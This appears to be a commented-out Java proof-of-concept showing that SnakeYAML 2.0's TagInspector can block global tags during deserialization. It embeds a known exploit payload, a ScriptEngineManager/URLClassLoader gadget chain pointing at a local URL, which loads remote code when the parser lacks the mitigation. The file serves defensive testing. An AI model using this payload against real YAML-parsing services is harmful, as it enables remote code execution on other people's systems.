// Uncomment and run this file with snakeyaml 2.0 to demonstrate global tag blocking
//
//package org.example;
//
//import org.yaml.snakeyaml.LoaderOptions;
//import org.yaml.snakeyaml.Yaml;
//import org.yaml.snakeyaml.constructor.Constructor;
//import org.yaml.snakeyaml.inspector.TagInspector;
//import org.yaml.snakeyaml.nodes.Tag;
//
//import java.io.ByteArrayInputStream;
//import java.io.InputStream;
//import java.util.Map;
//
//public class Poc {
//    public static void main(String[] args) {
//
//        String vector = "some_var: !!javax.script.ScriptEngineManager " +
//                "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080\"]]]]";
//        InputStream is = new ByteArrayInputStream(vector.getBytes());
//        LoaderOptions options = new LoaderOptions();
//        TagInspector allowedTags = new TagInspector() {
//            @Override
//            public boolean isGlobalTagAllowed(Tag tag) {
//                return false;
//            }
//        };
//        options.setTagInspector(allowedTags);
//        Yaml yaml = new Yaml(new Constructor(Test.class, options));
//
//        Map<String, Object> obj = yaml.load(is);
//    }
//}
//
//class Test {
//    public String some_var = "abc";
//}
//
